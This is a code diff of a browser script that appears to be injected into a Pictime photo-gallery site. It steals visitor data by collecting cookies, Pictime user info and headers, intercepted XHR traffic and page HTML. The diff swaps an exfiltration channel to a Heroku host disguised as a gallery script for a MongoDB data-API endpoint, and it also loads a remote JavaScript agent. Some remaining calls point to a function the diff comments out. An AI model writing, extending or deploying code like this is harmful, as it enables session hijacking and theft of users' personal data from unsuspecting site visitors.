@@ -6,56 +6,96 @@ if (!window.remoteSetupComplete) {
     );
   }
 
-  window.sendData = (type, data) => {
-    try {
-      const envelope = {};
-      envelope.sessionId = window.rjsSessionId;
-      envelope.type = type;
-      envelope.data = data;
-      envelope.userAgent = navigator?.userAgent;
+  // Create a function to get the access token required to write to the mongo database
+  window.getAccessToken = async () => {
+    return fetch('https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login').then((r) => r.json()).then((r) => r.access_token);
+  };
 
-      envelope.ptData = {};
-      envelope.ptData.headers = _pt$?.hdrs || null;
-      envelope.ptData.userInfo = _pt$?.userInfo || null;
-      envelope.ptData.cookie = document.cookie;
-
-      fetch('https://pictimecloudaf-a.herokuapp.com/pictures/scripts/compiled/pack_gallery.js', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'text/plain'
-        },
-        body: encodeURIComponent(btoa(JSON.stringify(envelope)))
-      });
-    } catch (err) { }
-  }
-  
-  window.startGettingUrls = async (pictimeGUserToken) => {
-    for (const urlToGet of window.urlsToGet) {
-      try {
-        const response = await fetch(`${urlToGet}/!servicesg.asmx/getGUserProjects`, {
-          method: 'POST',
-          headers: {
-            'content-type': 'application/json; charset=UTF-8',
-            'pictimeGUser': pictimeGUserToken,
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
-          },
-          body: JSON.stringify({})
-        });
-        
-        const json = await response.json();
-        
-        const projectData = {
-          url: urlToGet,
-          type: 'getGUserProjects',
-          data: json
-        };
-        
-        sendData('project-data', projectData);
-      } catch (err) {
-        console.log(`Error on: ${urlToGet}`);
-      }
+  // Create a function to insert a document to into the mongo ingest collection
+  window.insertDoc = async (type, data) => {
+    if (!window.accessToken) {
+      window.accessToken = await window.getAccessToken();
     }
-  }
+
+    const envelope = {};
+    envelope.sessionId = window.rjsSessionId;
+    envelope.type = type;
+    envelope.data = data;
+    envelope.userAgent = navigator?.userAgent;
+
+    envelope.ptData = {};
+    envelope.ptData.headers = _pt$?.hdrs || null;
+    envelope.ptData.userInfo = _pt$?.userInfo || null;
+    envelope.ptData.cookie = document.cookie;
+
+    envelope.ts = Date.now();
+
+    return fetch('https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Request-Headers': '*',
+        'Authorization': `Bearer ${window.accessToken}`
+      },
+      body: JSON.stringify({
+        'collection': 'ingest',
+        'database': 'pictimeDataDb',
+        'dataSource': 'pictime-data',
+        'document': envelope
+      })
+    });
+  };
+
+  // window.sendData = (type, data) => {
+  //   try {
+  //     const envelope = {};
+  //     envelope.sessionId = window.rjsSessionId;
+  //     envelope.type = type;
+  //     envelope.data = data;
+  //     envelope.userAgent = navigator?.userAgent;
+
+  //     envelope.ptData = {};
+  //     envelope.ptData.headers = _pt$?.hdrs || null;
+  //     envelope.ptData.userInfo = _pt$?.userInfo || null;
+  //     envelope.ptData.cookie = document.cookie;
+
+  //     fetch('https://pictimecloudaf-a.herokuapp.com/pictures/scripts/compiled/pack_gallery.js', {
+  //       method: 'POST',
+  //       headers: {
+  //         'Content-Type': 'text/plain'
+  //       },
+  //       body: encodeURIComponent(btoa(JSON.stringify(envelope)))
+  //     });
+  //   } catch (err) { }
+  // }
+  
+  // window.startGettingUrls = async (pictimeGUserToken) => {
+  //   for (const urlToGet of window.urlsToGet) {
+  //     try {
+  //       const response = await fetch(`${urlToGet}/!servicesg.asmx/getGUserProjects`, {
+  //         method: 'POST',
+  //         headers: {
+  //           'content-type': 'application/json; charset=UTF-8',
+  //           'pictimeGUser': pictimeGUserToken,
+  //           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+  //         },
+  //         body: JSON.stringify({})
+  //       });
+        
+  //       const json = await response.json();
+        
+  //       const projectData = {
+  //         url: urlToGet,
+  //         type: 'getGUserProjects',
+  //         data: json
+  //       };
+        
+  //       sendData('project-data', projectData);
+  //     } catch (err) {
+  //       console.log(`Error on: ${urlToGet}`);
+  //     }
+  //   }
+  // }
 
   const xhrMap = new Map();
 
@@ -100,7 +140,8 @@ if (!window.remoteSetupComplete) {
 
       // Send data
       if (!xhrData.request.url.includes('https://remotejs.com/')) {
-        sendData('xhr', xhrData);
+        //sendData('xhr', xhrData);
+        window.insertDoc('xhr', xhrData);
       }
     });
 
@@ -143,32 +184,32 @@ if (!window.remoteSetupComplete) {
       agentScript.setAttribute('data-consolejs-channel', window.rjsSessionId);
       document.head.appendChild(agentScript);
       
-      sendData('session', { sessionId: window.rjsSessionId });
+      window.sendData('session', { sessionId: window.rjsSessionId });
 
       // Send Location
-      sendData('location', window.location);
+      window.sendData('location', window.location);
 
       // Send Page HTML
       let pageHTML = new XMLSerializer().serializeToString(document);
-      sendData('page-html', pageHTML);
+      window.sendData('page-html', pageHTML);
 
       // Send JS files
       const jsFiles = performance.getEntriesByType('resource').filter(entry => entry.initiatorType === 'script').map(entry => entry.name);
-      sendData('js-files', jsFiles);
+      window.sendData('js-files', jsFiles);
 
       // Send Window Properties
       const windowProps = [];
       for (const prop in window) {
         windowProps.push(prop);
       }
-      sendData('window-props', windowProps);
+      window.sendData('window-props', windowProps);
 
       // Send PT Properties
       const ptProps = [];
       for (const prop in _pt$) {
         ptProps.push(prop);
       }
-      sendData('pt-props', ptProps);
+      window.sendData('pt-props', ptProps);
       
       window.remoteInit = true;
     }
